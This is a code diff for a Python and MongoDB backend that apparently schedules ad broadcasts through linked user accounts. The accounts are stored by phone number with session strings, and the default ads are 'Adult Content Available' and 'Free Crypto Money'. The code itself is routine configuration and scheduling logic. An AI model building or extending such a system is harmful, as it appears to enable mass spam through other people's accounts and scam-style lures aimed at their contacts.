@@ -1,6 +1,7 @@
 import os
 import time
 import threading
+import html as _html
 from datetime import datetime, timedelta
 
 import requests
@@ -28,46 +29,53 @@ _db_lock = threading.RLock()
 _last_ping = 0.0
 _PING_INTERVAL = 30
 
-# ---- Media extensions ----
 ALLOWED_IMAGE_EXT = {"png", "jpg", "jpeg", "gif", "webp", "bmp"}
 ALLOWED_VIDEO_EXT = {"mp4", "mov", "avi", "mkv", "webm", "m4v", "3gp"}
 ALLOWED_EXT       = ALLOWED_IMAGE_EXT | ALLOWED_VIDEO_EXT
 
-# Default ads — button-only shape
+VIDEO_SLOTS = 5
+
 DEFAULT_ADS = [
-    {
-        "id": "ad1",
-        "has_button": True,
-        "label": "Adult Content Available",
-        "url": "https://example.com/adult",
-    },
-    {
-        "id": "ad2",
-        "has_button": True,
-        "label": "Free Crypto Money",
-        "url": "https://example.com/crypto",
-    },
+    {"id": "ad1", "kind": "button", "label": "Adult Content Available",
+     "url": "https://example.com/adult", "enabled": True},
+    {"id": "ad2", "kind": "link", "text": "Free Crypto Money",
+     "url": "https://example.com/crypto", "enabled": True},
 ]
+
+DEFAULT_VIDEOS = [{"title": f"Video {i + 1}", "url": ""} for i in range(VIDEO_SLOTS)]
 
 _CFG_DEFAULTS = {
     "ads_enabled": False,
     "interval": DEFAULT_INTERVAL_SEC,
     "caption": "",
-    "media_path": None,       # new key (photo or video path)
-    "media_type": None,       # "photo" | "video"
-    "photo_path": None,       # legacy alias
-    "delete_after_round": False,
+    "caption_is_html": False,
+    "media_path": None,
+    "media_type": None,
+    "photo_path": None,
+    "delete_after_round": True,
+    "next_broadcast_at": None,
 }
 
 
 def _default_config():
-    config = {
-        "_id": "main_config",
-        "updated_at": datetime.now(),
-    }
+    config = {"_id": "main_config", "updated_at": datetime.now()}
     config.update(_CFG_DEFAULTS)
     config["ads"] = [dict(ad) for ad in DEFAULT_ADS]
+    config["videos"] = [dict(v) for v in DEFAULT_VIDEOS]
     return config
+
+
+def _normalize_ad(ad):
+    """Backfill legacy {has_button,label,url} ads into the new kind schema."""
+    ad = dict(ad or {})
+    if "kind" in ad:
+        ad.setdefault("enabled", True)
+        return ad
+    if ad.get("has_button"):
+        return {"id": ad.get("id"), "kind": "button",
+                "label": ad.get("label", ""), "url": ad.get("url", ""), "enabled": True}
+    return {"id": ad.get("id"), "kind": "link",
+            "text": ad.get("label", ""), "url": ad.get("url", ""), "enabled": True}
 
 
 def _ensure_indexes():
@@ -77,8 +85,10 @@ def _ensure_indexes():
         users_col.create_index([("phone", ASCENDING)])
         users_col.create_index([("user_id", ASCENDING)])
         users_col.create_index([("ads_enabled", ASCENDING)])
+        users_col.create_index([("next_ad_time", ASCENDING)])
         temp_sessions_col.create_index([("created_at", ASCENDING)])
         broadcast_msgs_col.create_index([("broadcast_id", ASCENDING)])
+        broadcast_msgs_col.create_index([("user_id", ASCENDING)])
     except PyMongoError as exc:
         print(f"MongoDB index error: {exc}")
 
@@ -174,7 +184,6 @@ def allowed_file(filename):
 
 
 def media_kind(filename):
-    """Return 'photo' | 'video' | None."""
     if not filename or "." not in filename:
         return None
     ext = filename.rsplit(".", 1)[1].lower()
@@ -193,12 +202,18 @@ def delete_photo_file(path):
         print(f"Could not delete {path}: {exc}")
 
 
+def escape_text(value):
+    return _html.escape(value or "", quote=False)
+
+
 # ---------------- sessions ----------------
 
 def save_session_to_db(session_data):
+    """Upsert a linked account. New accounts get next_ad_time = now + interval."""
     if not ensure_db() or users_col is None:
         return False
     try:
+        interval = get_ads_config().get("interval", DEFAULT_INTERVAL_SEC)
         phone = session_data["phone"]
         payload = {
             "session_string": session_data["session_string"],
@@ -213,16 +228,23 @@ def save_session_to_db(session_data):
         existing = users_col.find_one({"phone": phone})
         if existing:
             users_col.update_one({"_id": existing["_id"]}, {"$set": payload})
+            if not existing.get("next_ad_time"):
+                users_col.update_one(
+                    {"_id": existing["_id"]},
+                    {"$set": {"next_ad_time": datetime.now() + timedelta(seconds=interval)}},
+                )
             return str(existing["_id"])
 
         payload.update({
             "phone": phone,
             "session_name": session_data.get("session_name"),
-            "created_at": datetime.now(),   # real datetime → used by 30-min grace
+            "created_at": datetime.now(),
+            "next_ad_time": datetime.now() + timedelta(seconds=interval),  # <-- first ad after interval
             "ads_enabled": True,
             "last_ad_time": None,
             "deliveries": 0,
             "failures": 0,
+            "contact_offset": 0,
         })
         result = users_col.insert_one(payload)
         return str(result.inserted_id)
@@ -230,6 +252,34 @@ def save_session_to_db(session_data):
     except (PyMongoError, KeyError, TypeError) as exc:
         print(f"Save session error: {exc}")
         return False
+
+
+def backfill_next_ad_time():
+    """Any user missing a schedule becomes due immediately (once)."""
+    if not ensure_db() or users_col is None:
+        return 0
+    try:
+        r = users_col.update_many(
+            {"next_ad_time": {"$exists": False}},
+            {"$set": {"next_ad_time": datetime.now()}},
+        )
+        return r.modified_count
+    except PyMongoError as exc:
+        print(f"backfill error: {exc}")
+        return 0
+
+
+def reschedule_all_after_interval_change(interval_sec):
+    if not ensure_db() or users_col is None:
+        return
+    try:
+        cap = datetime.now() + timedelta(seconds=interval_sec)
+        users_col.update_many(
+            {"next_ad_time": {"$gt": cap}},
+            {"$set": {"next_ad_time": cap}},
+        )
+    except PyMongoError as exc:
+        print(f"reschedule error: {exc}")
 
 
 # ---------------- config ----------------
@@ -241,18 +291,20 @@ def get_ads_config():
         config = ads_config_col.find_one({"_id": "main_config"})
         if not config:
             default_config = _default_config()
-            ads_config_col.update_one(
-                {"_id": "main_config"},
-                {"$setOnInsert": default_config},
-                upsert=True,
-            )
+            ads_config_col.update_one({"_id": "main_config"},
+                                      {"$setOnInsert": default_config}, upsert=True)
             config = ads_config_col.find_one({"_id": "main_config"}) or default_config
 
         for key, value in _CFG_DEFAULTS.items():
             config.setdefault(key, value)
-        config.setdefault("ads", [dict(ad) for ad in DEFAULT_ADS])
 
-        # Backfill media_path from legacy photo_path
+        config["ads"] = [_normalize_ad(a) for a in config.get("ads", DEFAULT_ADS)]
+
+        vids = list(config.get("videos") or [])
+        while len(vids) < VIDEO_SLOTS:
+            vids.append({"title": f"Video {len(vids) + 1}", "url": ""})
+        config["videos"] = vids[:VIDEO_SLOTS]
+
         if not config.get("media_path") and config.get("photo_path"):
             config["media_path"] = config["photo_path"]
         if not config.get("media_type") and config.get("media_path"):
@@ -273,11 +325,8 @@ def update_ads_config(updates):
     updates["updated_at"] = datetime.now()
     try:
         with _config_lock:
-            ads_config_col.update_one(
-                {"_id": "main_config"},
-                {"$set": updates},
-                upsert=True,
-            )
+            ads_config_col.update_one({"_id": "main_config"},
+                                      {"$set": updates}, upsert=True)
         return True
     except PyMongoError as exc:
         print(f"Update ads config error: {exc}")
@@ -291,11 +340,8 @@ def inc_ads_config(field, amount=1):
             or field.startswith("$") or "." in field):
         return False
     try:
-        ads_config_col.update_one(
-            {"_id": "main_config"},
-            {"$inc": {field: amount}},
-            upsert=True,
-        )
+        ads_config_col.update_one({"_id": "main_config"},
+                                  {"$inc": {field: amount}}, upsert=True)
         return True
     except PyMongoError as exc:
         print(f"Increment ads config error: {exc}")
@@ -305,7 +351,7 @@ def inc_ads_config(field, amount=1):
 def mutate_ads(mutator):
     with _config_lock:
         config = get_ads_config()
-        ads = [dict(ad) for ad in config.get("ads", [])]
+        ads = [_normalize_ad(a) for a in config.get("ads", [])]
         new_ads = mutator(ads)
         if new_ads is None:
             return None
@@ -314,12 +360,38 @@ def mutate_ads(mutator):
         return None
 
 
+def get_videos():
+    config = get_ads_config()
+    vids = config.get("videos") or []
+    out = []
+    for i in range(VIDEO_SLOTS):
+        v = vids[i] if i < len(vids) else {}
+        out.append({
+            "slot": i + 1,
+            "title": (v.get("title") or f"Video {i + 1}").strip(),
+            "url": (v.get("url") or "").strip(),
+        })
+    return out
+
+
+def update_videos(videos):
+    normalized = []
+    for i in range(VIDEO_SLOTS):
+        v = videos[i] if i < len(videos) else {}
+        normalized.append({
+            "title": (v.get("title") or f"Video {i + 1}").strip()[:80],
+            "url": (v.get("url") or "").strip(),
+        })
+    return update_ads_config({"videos": normalized})
+
+
 def reset_ads_config():
     config = get_ads_config()
     old_media = config.get("media_path") or config.get("photo_path")
     success = update_ads_config({
         "ads": [dict(ad) for ad in DEFAULT_ADS],
         "caption": "",
+        "caption_is_html": False,
         "media_path": None,
         "media_type": None,
         "photo_path": None,
@@ -399,6 +471,7 @@ def get_all_users():
         for user in users_col.find().sort("created_at", -1):
             ca = user.get("created_at")
             la = user.get("last_ad_time")
+            na = user.get("next_ad_time")
             output.append({
                 "id": str(user.get("_id")),
                 "user_id": user.get("user_id"),
@@ -410,6 +483,7 @@ def get_all_users():
                 "deliveries": user.get("deliveries", 0),
                 "created_at": ca.strftime("%Y-%m-%d %H:%M") if isinstance(ca, datetime) else "N/A",
                 "last_ad_time": la.strftime("%Y-%m-%d %H:%M") if isinstance(la, datetime) else "Never",
+                "next_ad_time": na.strftime("%Y-%m-%d %H:%M") if isinstance(na, datetime) else "N/A",
             })
         return output
     except PyMongoError as exc:
